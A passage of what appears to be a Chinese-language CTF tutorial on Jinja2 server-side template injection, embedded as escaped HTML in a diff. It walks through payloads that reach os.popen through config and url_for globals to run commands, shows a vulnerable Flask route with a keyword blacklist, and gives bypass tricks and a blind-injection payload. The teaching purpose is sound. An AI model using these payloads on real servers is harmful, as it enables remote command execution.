class="o">=&lt;/span>&lt;span class="vm">__globals__&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>&lt;img src="https://hadagaga.github.io/p/python%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90%E4%BB%8E%E6%88%90%E5%9B%A0%E5%88%B0%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E4%BB%8E%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E5%88%B0%E7%BB%95%E8%BF%87%E4%BB%8E%E5%9B%9E%E6%98%BE%E5%88%B0%E7%9B%B2%E6%B3%A8/image-20241218125507640.png"
+width="710"
+height="49"
+srcset="https://hadagaga.github.io/p/python%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90%E4%BB%8E%E6%88%90%E5%9B%A0%E5%88%B0%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E4%BB%8E%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E5%88%B0%E7%BB%95%E8%BF%87%E4%BB%8E%E5%9B%9E%E6%98%BE%E5%88%B0%E7%9B%B2%E6%B3%A8/image-20241218125507640_hu11176517728642960871.png 480w, https://hadagaga.github.io/p/python%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90%E4%BB%8E%E6%88%90%E5%9B%A0%E5%88%B0%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E4%BB%8E%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E5%88%B0%E7%BB%95%E8%BF%87%E4%BB%8E%E5%9B%9E%E6%98%BE%E5%88%B0%E7%9B%B2%E6%B3%A8/image-20241218125507640_hu1167661395724464505.png 1024w"
+loading="lazy"
+alt="image-20241218125507640"
+class="gallery-image"
+data-flex-grow="1448"
+data-flex-basis="3477px"
+>&lt;/p>
+&lt;p>​ 利用放入了config配置文件中的globals字符串获取全局方法，并放入config中：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="nb">set&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="mi">20&lt;/span>&lt;span class="n">x&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">config&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">update&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">f&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">config&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">l&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="n">attr&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">config&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">c&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="p">}{&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">config&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>​ 这里使用了attr去绕过了[]，不使用&amp;rsquo;.&amp;lsquo;是因为config.l使用了&amp;rsquo;.&amp;lsquo;再使用点会导致语法错误。&lt;/p>
+&lt;p>&lt;img src="https://hadagaga.github.io/p/python%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90%E4%BB%8E%E6%88%90%E5%9B%A0%E5%88%B0%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E4%BB%8E%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E5%88%B0%E7%BB%95%E8%BF%87%E4%BB%8E%E5%9B%9E%E6%98%BE%E5%88%B0%E7%9B%B2%E6%B3%A8/image-20241218132923973.png"
+width="766"
+height="685"
+srcset="https://hadagaga.github.io/p/python%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90%E4%BB%8E%E6%88%90%E5%9B%A0%E5%88%B0%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E4%BB%8E%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E5%88%B0%E7%BB%95%E8%BF%87%E4%BB%8E%E5%9B%9E%E6%98%BE%E5%88%B0%E7%9B%B2%E6%B3%A8/image-20241218132923973_hu18190149847120876745.png 480w, https://hadagaga.github.io/p/python%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90%E4%BB%8E%E6%88%90%E5%9B%A0%E5%88%B0%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E4%BB%8E%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E5%88%B0%E7%BB%95%E8%BF%87%E4%BB%8E%E5%9B%9E%E6%98%BE%E5%88%B0%E7%9B%B2%E6%B3%A8/image-20241218132923973_hu5361369121844154483.png 1024w"
+loading="lazy"
+alt="image-20241218132923973"
+class="gallery-image"
+data-flex-grow="111"
+data-flex-basis="268px"
+>&lt;/p>
+&lt;p>​ 然后就是获取os模块：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="nb">set&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="mi">20&lt;/span>&lt;span class="n">x&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">config&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">update&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">o&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">config&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">f&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">os&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="p">}{&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">config&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>​ &lt;img src="https://hadagaga.github.io/p/python%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90%E4%BB%8E%E6%88%90%E5%9B%A0%E5%88%B0%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E4%BB%8E%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E5%88%B0%E7%BB%95%E8%BF%87%E4%BB%8E%E5%9B%9E%E6%98%BE%E5%88%B0%E7%9B%B2%E6%B3%A8/image-20241218133223143.png"
+width="642"
+height="66"
+srcset="https://hadagaga.github.io/p/python%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90%E4%BB%8E%E6%88%90%E5%9B%A0%E5%88%B0%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E4%BB%8E%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E5%88%B0%E7%BB%95%E8%BF%87%E4%BB%8E%E5%9B%9E%E6%98%BE%E5%88%B0%E7%9B%B2%E6%B3%A8/image-20241218133223143_hu9092347267223826468.png 480w, https://hadagaga.github.io/p/python%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90%E4%BB%8E%E6%88%90%E5%9B%A0%E5%88%B0%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E4%BB%8E%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E5%88%B0%E7%BB%95%E8%BF%87%E4%BB%8E%E5%9B%9E%E6%98%BE%E5%88%B0%E7%9B%B2%E6%B3%A8/image-20241218133223143_hu13828571288433294799.png 1024w"
+loading="lazy"
+alt="image-20241218133223143"
+class="gallery-image"
+data-flex-grow="972"
+data-flex-basis="2334px"
+>&lt;/p>
+&lt;p>​ 获取popen方法：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="nb">set&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="mi">20&lt;/span>&lt;span class="n">x&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">config&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">update&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">p&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">config&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">o&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">popen&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="p">}{&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">config&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>​ &lt;img src="https://hadagaga.github.io/p/python%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90%E4%BB%8E%E6%88%90%E5%9B%A0%E5%88%B0%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E4%BB%8E%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E5%88%B0%E7%BB%95%E8%BF%87%E4%BB%8E%E5%9B%9E%E6%98%BE%E5%88%B0%E7%9B%B2%E6%B3%A8/image-20241218133344217.png"
+width="614"
+height="46"
+srcset="https://hadagaga.github.io/p/python%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90%E4%BB%8E%E6%88%90%E5%9B%A0%E5%88%B0%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E4%BB%8E%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E5%88%B0%E7%BB%95%E8%BF%87%E4%BB%8E%E5%9B%9E%E6%98%BE%E5%88%B0%E7%9B%B2%E6%B3%A8/image-20241218133344217_hu12340181211558879402.png 480w, https://hadagaga.github.io/p/python%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90%E4%BB%8E%E6%88%90%E5%9B%A0%E5%88%B0%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E4%BB%8E%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E5%88%B0%E7%BB%95%E8%BF%87%E4%BB%8E%E5%9B%9E%E6%98%BE%E5%88%B0%E7%9B%B2%E6%B3%A8/image-20241218133344217_hu14738590488212321347.png 1024w"
+loading="lazy"
+alt="image-20241218133344217"
+class="gallery-image"
+data-flex-grow="1334"
+data-flex-basis="3203px"
+>&lt;/p>
+&lt;p>​ 然后就可以进行命令执行了：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="n">txt&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">config&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">p&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">request&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">args&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">a&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">read&lt;/span>&lt;span class="p">())&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">a&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">whoami&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>​ &lt;img src="https://hadagaga.github.io/p/python%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90%E4%BB%8E%E6%88%90%E5%9B%A0%E5%88%B0%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E4%BB%8E%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E5%88%B0%E7%BB%95%E8%BF%87%E4%BB%8E%E5%9B%9E%E6%98%BE%E5%88%B0%E7%9B%B2%E6%B3%A8/image-20241218133501552.png"
+width="1400"
+height="402"
+srcset="https://hadagaga.github.io/p/python%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90%E4%BB%8E%E6%88%90%E5%9B%A0%E5%88%B0%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E4%BB%8E%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E5%88%B0%E7%BB%95%E8%BF%87%E4%BB%8E%E5%9B%9E%E6%98%BE%E5%88%B0%E7%9B%B2%E6%B3%A8/image-20241218133501552_hu3184389744779129317.png 480w, https://hadagaga.github.io/p/python%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90%E4%BB%8E%E6%88%90%E5%9B%A0%E5%88%B0%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E4%BB%8E%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E5%88%B0%E7%BB%95%E8%BF%87%E4%BB%8E%E5%9B%9E%E6%98%BE%E5%88%B0%E7%9B%B2%E6%B3%A8/image-20241218133501552_hu15221106624041859805.png 1024w"
+loading="lazy"
+alt="image-20241218133501552"
+class="gallery-image"
+data-flex-grow="348"
+data-flex-basis="835px"
+>&lt;/p>
+&lt;h3 id="盲注">盲注
+&lt;/h3>&lt;p>​ 上述所有的讨论都是在有回显的情况下进行的注入，但是比赛中并不是所有题目都会给出回显，而针对没有回显的情况一般就几种方式，盲注，写文件，弹shell，或者用钩子函数外带结果，这里先介绍盲注和钩子函数。&lt;/p>
+&lt;h4 id="布尔盲注">布尔盲注
+&lt;/h4>&lt;p>这里给出一个简单的示例：&lt;/p>
+&lt;h5 id="原题第十八届全国大学生信息安全竞赛创新实践能力赛暨第二届长城杯铁人三项赛防护赛--safe_proxy">原题：第十八届全国大学生信息安全竞赛（创新实践能力赛）暨第二届“长城杯”铁人三项赛（防护赛）- Safe_Proxy
+&lt;/h5>&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="nd">@app.route&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;/&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">methods&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;POST&amp;#34;&lt;/span>&lt;span class="p">])&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">template&lt;/span>&lt;span class="p">():&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">template_code&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">request&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">form&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">get&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;code&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1"># 安全过滤&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">blacklist&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;__&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;import&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;os&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;sys&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;eval&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;subprocess&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;popen&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;system&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="se">\r&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="p">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="n">black&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">blacklist&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="n">black&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">template_code&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="s2">&amp;#34;Forbidden content detected!&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">result&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">render_template_string&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">template_code&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">result&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="s1">&amp;#39;ok&amp;#39;&lt;/span> &lt;span class="k">if&lt;/span> &lt;span class="n">result&lt;/span> &lt;span class="ow">is&lt;/span> &lt;span class="ow">not&lt;/span> &lt;span class="kc">None&lt;/span> &lt;span class="k">else&lt;/span> &lt;span class="s1">&amp;#39;error&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>​ 这里是一个显然的盲注，因为渲染的结果没有返回到前端中，且这里还拦截了一些关键字，我们开始分析：&lt;/p>
+&lt;p>import，os，sys，eval，subprocess，popen，system：这些关键字的拦截我们可以使用字符串拼接绕过的方式来实现绕过。&lt;/p>
+&lt;p>__：针对下划线的绕过我们可以采用十六进制编码绕过。&lt;/p>
+&lt;p>\r，\n：这两个拦截是凑字数的，没有任何的作用。&lt;/p>
+&lt;p>​ 这里我们已知结果不会返回前端，那么我们就需要使用盲注，这里先使用布尔盲注，写出payload：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;span class="lnt">7
+&lt;/span>&lt;span class="lnt">8
+&lt;/span>&lt;span class="lnt">9
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="nb">set&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">allchar&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;abcdefghijklmnopqrstuvwxyz0123456789!@#$%^%26*()-_+&lt;/span>&lt;span class="si">{}&lt;/span>&lt;span class="s2">[]|:;?/&amp;gt;&amp;lt;.,ABCDEFGHIJKLMNOPQRSTUVWXYZ&amp;#34;&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="nb">set&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">a&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;os&amp;#39;&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="nb">set&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">b&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;popen&amp;#39;&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="nb">set&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">res&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">url_for&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;__globals__&amp;#39;&lt;/span>&lt;span class="p">][&lt;/span>&lt;span class="n">a&lt;/span>&lt;span class="p">][&lt;/span>&lt;span class="n">b&lt;/span>&lt;span class="p">](&lt;/span>&lt;span class="s1">&amp;#39;whoami&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">read&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="k">if&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">res&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">==&lt;/span>&lt;span class="n">allchar&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="k">else&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">sleep&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="n">endif&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>​ 绕过关键字&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;span class="lnt">7
+&lt;/span>&lt;span class="lnt">8
+&lt;/span>&lt;span class="lnt">9
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="nb">set&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">allchar&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;abcdefghijklmnopqrstuvwxyz0123456789!@#$%^%26*()-_+&lt;/span>&lt;span class="si">{}&lt;/span>&lt;span class="s2">[]|:;?/&amp;gt;&amp;lt;.,ABCDEFGHIJKLMNOPQRSTUVWXYZ&amp;#34;&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="p">}&lt;/span>
